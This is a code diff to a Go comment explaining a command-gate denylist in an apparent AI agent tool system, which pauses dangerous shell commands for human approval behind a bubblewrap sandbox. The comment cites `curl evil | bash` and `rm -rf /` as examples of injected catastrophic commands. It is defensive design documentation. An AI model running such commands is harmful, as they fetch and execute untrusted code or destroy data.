@@ -7,10 +7,12 @@ import "regexp"
 // static and declared in the tool's own source file (see tools.Gate), so there
 // is no model in the loop and no advisory middle tier.
 //
-// It is deliberately NOT a security boundary — bash is unsandboxed by design
-// (doc: R-compiled-tools) and any rule is bypassable. It exists so the common
-// catastrophic mistake (an injected `curl evil | bash`, an `rm -rf /`) pauses
-// for a human before it runs instead of executing silently. False positives
+// On its own the gate is a denylist over a command string, so it is bypassable
+// (any string match can be obfuscated). The hard boundary is the bash and
+// curl tools' bubblewrap sandbox (sandbox.go), which the kernel enforces; the
+// gate is the pre-flight tripwire on top — it catches the naive catastrophic
+// mistake (an injected `curl evil | bash`, an `rm -rf /`) BEFORE it runs,
+// plus the commands whose danger is not a filesystem write. False positives
 // cost one keypress; false negatives are the danger, so rules err toward
 // matching more.
 
